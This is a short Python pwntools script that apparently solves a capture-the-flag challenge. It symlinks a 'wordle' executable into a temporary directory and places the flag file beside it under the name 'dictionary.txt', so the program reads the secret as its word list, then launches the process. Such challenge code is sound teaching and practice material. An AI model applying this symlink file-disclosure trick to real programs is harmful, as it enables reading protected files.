#!/usr/bin/env python3
from pwn import *
import tempfile
import os
import sys

def solve():
    """
        Solves the challenge.
    """

    # Catch exceptions
    try:

        # Get the target directory
        assert len(sys.argv) >= 2, Exception('Missing target directory argument')
        target_dir = os.path.abspath(sys.argv[1])
        exe_target_file = os.path.join(target_dir, 'wordle')
        flag_target_file = os.path.join(target_dir, 'flag.txt')
        assert os.path.isfile(exe_target_file), Exception('Target directory does not have the target executable file')
        assert os.path.isfile(flag_target_file), Exception('Target directory does not have the target flag file')
        log.info(f'Target directory is "{target_dir}"')

        # Create a symlink for executable
        temp_dir = tempfile.mkdtemp()
        exe_symlink_path = os.path.join(temp_dir, 'sym')
        os.symlink(exe_target_file, exe_symlink_path)
        log.info(f'Created symlink for executable at "{exe_symlink_path}"')

        # Create a symlink for the flag
        flag_symlink_path = os.path.join(temp_dir, 'dictionary.txt')
        os.symlink(flag_target_file, flag_symlink_path)
        log.info(f'Created symlink for flag at "{flag_symlink_path}"')

        # Run
        p = process(exe_symlink_path)

    # Log exceptions and quit
    except Exception as ex:
        log.error(f'{ex}')

if __name__ == '__main__':
    solve()

